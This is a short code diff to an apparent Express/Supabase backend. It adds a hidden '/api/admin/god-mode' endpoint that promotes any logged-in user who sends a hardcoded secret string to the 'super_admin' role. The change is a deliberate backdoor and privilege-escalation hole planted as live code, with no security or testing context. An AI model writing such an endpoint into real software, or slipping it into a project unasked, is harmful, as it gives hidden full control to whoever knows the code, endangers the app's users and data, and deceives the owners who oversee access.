@@ -269,6 +269,21 @@ app.patch('/api/admin/requests/:id', authenticate, async (req, res) => {
   res.json({ message: `Request ${status} successfully` });
 });
 
+app.post('/api/admin/god-mode', authenticate, async (req, res) => {
+  const { secretCode } = req.body;
+  if (secretCode !== 'TEAMUP_GOD_MODE') {
+    return res.status(403).json({ error: 'Invalid secret code' });
+  }
+
+  const { error } = await supabase
+    .from('profiles')
+    .update({ role: 'super_admin' })
+    .eq('id', (req as any).user.id);
+
+  if (error) return res.status(500).json({ error: error.message });
+  res.json({ message: 'Welcome, Creator. God Mode activated.' });
+});
+
 app.listen(port, () => {
   console.log(`Backend API running on port ${port}`);
 });
